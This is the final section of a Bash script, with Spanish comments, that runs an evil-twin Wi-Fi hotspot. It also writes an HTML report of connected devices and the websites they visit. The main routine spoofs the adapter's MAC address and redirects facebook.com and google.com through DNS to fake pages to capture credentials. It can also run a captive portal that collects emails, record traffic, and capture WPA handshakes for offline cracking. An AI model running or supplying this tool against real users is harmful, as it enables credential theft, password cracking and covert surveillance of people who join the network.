            border-bottom: 1px solid #ddd;
        }
        th {
            background: #4CAF50;
            color: white;
            font-weight: 600;
        }
        tr:hover {
            background: #f5f5f5;
        }
        .client { color: #2196F3; font-weight: 600; }
        .vendor { color: #FF9800; }
        .timestamp { color: #999; font-size: 0.9em; }
        pre {
            background: #f4f4f4;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-size: 0.9em;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Reporte OSINT - WiFi Hotspot Monitor</h1>
        
        <div class="warning">
            ADVERTENCIA: Este reporte contiene informacion sensible sobre dispositivos conectados a tu hotspot WiFi.
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3 id="total-clients">0</h3>
                <p>Clientes Conectados</p>
            </div>
            <div class="stat-card">
                <h3 id="total-traffic">0 MB</h3>
                <p>Tráfico Total</p>
            </div>
            <div class="stat-card">
                <h3 id="dns-queries">0</h3>
                <p>Consultas DNS</p>
            </div>
            <div class="stat-card">
                <h3 id="http-requests">0</h3>
                <p>Peticiones HTTP</p>
            </div>
        </div>
        
        <h2>👥 Clientes Conectados</h2>
        <table id="clients-table">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>IP Address</th>
                    <th>MAC Address</th>
                    <th>Vendor</th>
                    <th>Hostname</th>
                </tr>
            </thead>
            <tbody id="clients-body">
                <tr><td colspan="5" style="text-align:center;">Cargando datos...</td></tr>
            </tbody>
        </table>
        
        <h2>🌐 Sitios Web Visitados (HTTP)</h2>
        <table id="http-table">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Cliente IP</th>
                    <th>Host</th>
                    <th>URI</th>
                </tr>
            </thead>
            <tbody id="http-body">
                <tr><td colspan="4" style="text-align:center;">No hay datos HTTP capturados</td></tr>
            </tbody>
        </table>
        
        <h2>Archivos Generados</h2>
        <pre id="files-list">
Cargando lista de archivos...
        </pre>
        
        <p style="margin-top: 30px; text-align: center; color: #999; font-size: 0.9em;">
            Generado el: <span id="report-date"></span>
        </p>
    </div>
    
    <script>
        document.getElementById('report-date').textContent = new Date().toLocaleString();
    </script>
</body>
</html>
EOF

    success "Reporte OSINT generado: $OSINT_REPORT"
}

# Dashboard en tiempo real
show_dashboard() {
    echo ""
    log "═══════════════════════════════════════"
    if $OSINT_MODE && $SPOOF_MODE; then
        log "HOTSPOT ACTIVO - Modo Completo (OSINT + Spoofing)"
    elif $OSINT_MODE; then
        log "HOTSPOT ACTIVO - Modo OSINT"
    elif $SPOOF_MODE; then
        log "HOTSPOT ACTIVO - Modo DNS Spoofing"
    fi
    log "═══════════════════════════════════════"
    echo ""
    info "SSID: ${CYAN}$HOTSPOT_SSID${NC}"
    info "Canal: $HOTSPOT_CHANNEL"
    info "IP Gateway: $HOTSPOT_IP"
    if [[ -n "$HOTSPOT_PASSWORD" ]]; then
        info "Contraseña: ${YELLOW}$HOTSPOT_PASSWORD${NC}"
        info "Seguridad: WPA2"
    else
        info "Seguridad: ${RED}ABIERTA (sin contraseña)${NC}"
    fi
    
    # Mostrar MAC actual
    local current_mac=$(ip link show "$HOTSPOT_INTERFACE" 2>/dev/null | grep ether | awk '{print $2}')
    if $SPOOF_MAC; then
        info "MAC: ${MAGENTA}$current_mac${NC} ${YELLOW}(SPOOFED)${NC}"
    else
        info "MAC: $current_mac"
    fi
    echo ""
    
    if $OSINT_MODE; then
        info "Logs en: $OUTPUT_DIR"
        info "Clientes: $CLIENTS_FILE"
        info "Tráfico: $TRAFFIC_PCAP"
        info "DNS: $DNS_LOG"
        info "HTTP: $HTTP_LOG"
        info "Reporte: $OSINT_REPORT"
        
        # Mostrar info de handshakes si la red tiene contraseña
        if [[ -n "$HOTSPOT_PASSWORD" ]]; then
            info "Handshakes: $HANDSHAKE_CAP"
            warning "⚡ Capturando handshakes WPA para crackeo offline"
        fi
        echo ""
    fi
    
    if $SPOOF_MODE; then
        warning "DNS Spoofing activo:"
        warning "  • facebook.com → Página falsa"
        warning "  • google.com → Página falsa"
        info "Credenciales capturadas: $CAPTURED_CREDS"
        echo ""
    fi
    
    log "Monitoreando conexiones..."
    log "Presiona Ctrl+C para detener"
    echo ""
    
    # Mostrar clientes en tiempo real si OSINT está activo
    if $OSINT_MODE; then
        tail -f "$CLIENTS_FILE" 2>/dev/null &
    fi
}

# Main
main() {
    check_tools
    check_interfaces
    configure_hostapd
    configure_dnsmasq
    
    # Detener modo monitor si está activo
    log "Deteniendo modo monitor si existe..."
    airmon-ng stop "${HOTSPOT_INTERFACE}mon" > /dev/null 2>&1
    airmon-ng stop "$HOTSPOT_INTERFACE" > /dev/null 2>&1
    
    # Matar procesos que puedan interferir
    pkill -9 wpa_supplicant 2>/dev/null
    
    # Desactivar NetworkManager en esta interfaz
    nmcli device set "$HOTSPOT_INTERFACE" managed no 2>/dev/null
    
    # Configurar interfaz - Paso 1: Bajar y limpiar
    log "Configurando interfaz $HOTSPOT_INTERFACE..."
    ip link set "$HOTSPOT_INTERFACE" down
    sleep 1
    ip addr flush dev "$HOTSPOT_INTERFACE"
    
    # Aplicar MAC Spoofing si está configurado (interfaz ya está DOWN)
    apply_mac_spoofing
    
    # Configurar interfaz - Paso 2: Asignar IP y subir
    ip addr add "$HOTSPOT_IP/24" dev "$HOTSPOT_INTERFACE"
    ip link set "$HOTSPOT_INTERFACE" up
    sleep 2
    
    # Verificar que la IP se asignó correctamente
    if ! ip addr show "$HOTSPOT_INTERFACE" | grep -q "$HOTSPOT_IP"; then
        error "No se pudo asignar IP $HOTSPOT_IP a $HOTSPOT_INTERFACE"
        return 1
    fi
    
    # Iniciar hostapd
    log "Iniciando Access Point..."
    
    # Matar cualquier hostapd existente
    pkill -9 hostapd 2>/dev/null
    sleep 1
    
    # Iniciar en background con logging
    hostapd -B "$HOSTAPD_CONF" -f "$OUTPUT_DIR/hostapd.log"
    sleep 3
    
    # Verificar que esté corriendo
    HOSTAPD_PID=$(pgrep -f "hostapd")
    
    if [[ -z "$HOSTAPD_PID" ]]; then
        error "Hostapd falló al iniciar. Log:"
        tail -20 "$OUTPUT_DIR/hostapd.log"
        exit 1
    fi
    
    success "Access Point iniciado (PID: $HOSTAPD_PID)"
    
    # Verificar que el AP esté transmitiendo
    sleep 1
    if iw dev "$HOTSPOT_INTERFACE" info | grep -q "type AP"; then
        success "AP transmitiendo en canal $HOTSPOT_CHANNEL"
    else
        warning "No se pudo verificar el modo AP, pero continuando..."
    fi
    
    # Iniciar dnsmasq
    log "Iniciando DHCP/DNS..."
    
    # Matar cualquier dnsmasq existente
    pkill -9 dnsmasq 2>/dev/null
    sleep 1
    
    # Iniciar dnsmasq en background
    dnsmasq -C "$DNSMASQ_CONF" --no-daemon > "$OUTPUT_DIR/dnsmasq.log" 2>&1 &
    DNSMASQ_PID=$!
    sleep 2
    
    # Verificar que esté corriendo
    if ! ps -p $DNSMASQ_PID > /dev/null 2>&1; then
        error "Dnsmasq falló al iniciar. Log:"
        cat "$OUTPUT_DIR/dnsmasq.log"
        exit 1
    fi
    
    success "DHCP/DNS iniciado (PID: $DNSMASQ_PID)"
    
    # Verificar que esté escuchando
    if ! netstat -tuln | grep -q ":53 "; then
        warning "DNS puede no estar escuchando en puerto 53"
    fi
    
    # Configurar NAT o Portal Cautivo
    if $CAPTIVE_PORTAL; then
        # Configurar portal cautivo
        create_captive_portal
        start_captive_portal_server
        configure_captive_portal_iptables
        
        success "Portal cautivo activo en http://$HOTSPOT_IP:$CAPTIVE_PORT"
        info "Los emails capturados se guardarán en: $CAPTIVE_EMAILS_FILE"
    else
        # Configurar NAT normal
        configure_nat
    fi
    
    # Iniciar componentes según el modo
    if $SPOOF_MODE; then
        # DNS Spoofing ya configurado con dnsmasq
        info "Modo DNS Spoofing activado"
        
        if true; then
            monitor_captured_credentials
            
            # El DNS ya redirige los dominios spoofed a 192.168.50.1
            # Solo necesitamos que el servidor web responda en 80 y 443
            # NO redirigimos TODO el tráfico, solo los dominios que DNS resuelve a nosotros
            
            success "DNS Spoofing activo - Servidor respondiendo en $HOTSPOT_IP"
        else
            warning "Servidor web falló, continuando sin spoofing"
            SPOOF_MODE=false
        fi
    fi
    
    if $OSINT_MODE; then
        # Iniciar monitoreo de tráfico
        start_traffic_capture
        monitor_clients
        analyze_dns_traffic
        analyze_http_traffic
        
        # Iniciar captura de handshakes si la red tiene contraseña
        start_handshake_capture
    fi
    
    # Iniciar servidor web de logs
    start_web_server
    
    # Mostrar dashboard
    show_dashboard
    
    # Mantener el script corriendo y responder a Ctrl+C
    echo ""
    info "Presiona ${YELLOW}Ctrl+C${NC} para detener el hotspot"
    echo ""
    
    # Loop principal que responde rápidamente a señales
    while true; do
        sleep 0.5
        # Verificar si los procesos principales siguen corriendo
        if ! ps -p $HOSTAPD_PID > /dev/null 2>&1; then
            error "Hostapd se detuvo inesperadamente"
            break
        fi
        if ! ps -p $DNSMASQ_PID > /dev/null 2>&1; then
            error "Dnsmasq se detuvo inesperadamente"
            break
        fi
    done
}

main
